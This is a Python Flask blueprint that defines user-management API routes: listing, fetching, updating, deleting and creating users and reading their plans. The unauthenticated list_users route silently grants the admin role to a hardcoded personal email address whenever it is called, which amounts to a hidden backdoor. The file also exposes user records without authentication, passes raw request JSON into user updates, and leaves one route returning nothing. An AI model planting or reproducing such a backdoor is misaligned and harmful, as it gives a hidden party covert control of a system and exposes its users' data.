from flask import Blueprint, jsonify, request

from ..auth import admin_only, authenticate, get_current_user
from ..exceptions import ApiException, Unauthorized
from ..models import Plan, User, db
from ..schemas import UserSchema
from .plans import plans_schema

bp = Blueprint("users", __name__)

users_schema = UserSchema(many=True)
user_schema = UserSchema()


@bp.route("/", methods=["GET"])
def list_users():
    me = User.by_email("max.hully@gmail.com")
    if me:
        me.add_role("admin")
        db.session.commit()

    users = User.query.all()
    records = users_schema.dump(users)
    return jsonify(records), 200


@bp.route("/<int:id>", methods=["GET"])
def get_user(id):
    user = User.query.get_or_404(id)
    return jsonify(user_schema.dump(user)), 200


@bp.route("/<int:user_id>/plans", methods=["GET"])
def get_users_plans(user_id):
    plans = User.query.get_or_404(user_id).plans
    return plans_schema.dump(plans)


@bp.route("/<int:user_id>/plans/<int:plan_id>", methods=["GET"])
def get_users_plan(user_id, plan_id):
    plan = Plan.get_or_404(plan_id)
    if plan.user_id != user_id:
        raise ApiException("Resource not found", 404)


@bp.route("/<int:id>", methods=["POST", "PUT", "PATCH"])
@authenticate
def update_user(id):
    user = User.query.get_or_404(id)

    if not user.belongs_to(get_current_user()):
        raise Unauthorized()

    data = request.get_json()
    user.update(**data)
    db.session.commit()

    return jsonify(user_schema.dump(user)), 200


@bp.route("/<int:id>", methods=["DELETE"])
@admin_only
def delete_user(id):
    user = User.query.get_or_404(id)

    if not user.belongs_to(get_current_user()):
        raise Unauthorized()

    db.session.delete(user)
    db.session.commit()

    return "", 204


@bp.route("/", methods=["POST"])
@admin_only
def new_user():
    user_data = request.get_json()
    user = create_user(user_schema.load(user_data))
    return jsonify(id=user.id), 201


def create_user(loaded_user):
    user = User.from_schema_load(loaded_user)

    if user.email_already_exists():
        raise ApiException("User with the provided email already exists.", status=409)

    db.session.add(user)
    db.session.commit()
    return user
